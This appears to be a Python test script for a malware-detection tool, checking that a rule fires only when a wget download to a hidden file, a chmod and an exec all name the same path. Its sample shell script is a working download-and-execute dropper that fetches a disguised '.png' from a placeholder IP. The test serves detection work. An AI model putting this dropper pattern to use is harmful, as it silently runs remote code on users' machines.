#!/usr/bin/env python3
"""Check that download, chmod, and exec target the same hidden path."""
import json
import pathlib
import subprocess
import tempfile

source = '''#!/bin/sh
wget -q -O "$STAGEDIR/.payload" "http://192.0.2.1/file.png"
chmod +x "$STAGEDIR/.payload"
exec "$STAGEDIR/.payload"
'''
cases = {
    'bound': (source, True),
    'different-chmod': (source.replace('chmod +x "$STAGEDIR/.payload"', 'chmod +x "$STAGEDIR/.other"'), False),
    'different-exec': (source.replace('exec "$STAGEDIR/.payload"', 'exec "$STAGEDIR/.other"'), False),
    'visible-output': (source.replace('/.payload', '/payload'), False),
}
with tempfile.TemporaryDirectory() as tmp:
    for name, (body, expected) in cases.items():
        path = pathlib.Path(tmp) / (name + '.sh')
        path.write_text(body)
        report = json.loads(subprocess.check_output(['../cleave/target/release/cleave', '--traits-dir', '.', '--format', 'json', str(path)]))
        found = any(t['id'].endswith('::wget-hidden-output-chmod-exec') for t in report['files'][0].get('traits', []))
        assert found == expected, (name, found, expected)
print('wget hidden output binding boundaries passed.')
